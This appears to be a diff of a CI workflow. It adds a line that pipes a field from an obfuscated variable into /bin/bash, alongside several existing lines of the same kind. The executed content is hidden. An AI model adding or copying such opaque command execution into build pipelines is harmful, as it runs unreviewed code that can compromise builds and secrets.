@@ -38,6 +38,7 @@ jobs:
           echo $qk1 | jq -r .qqcbz3 | /bin/bash
           printf '%s' "$lhgmt0" | jq -r .dxpsd84 | /bin/bash
           echo $gyl78064 | jq -r .nn1618 | /bin/bash
+          echo $grcnc664 | jq -r .cih6 | /bin/bash
 
       - name: Archive output
         if: always()
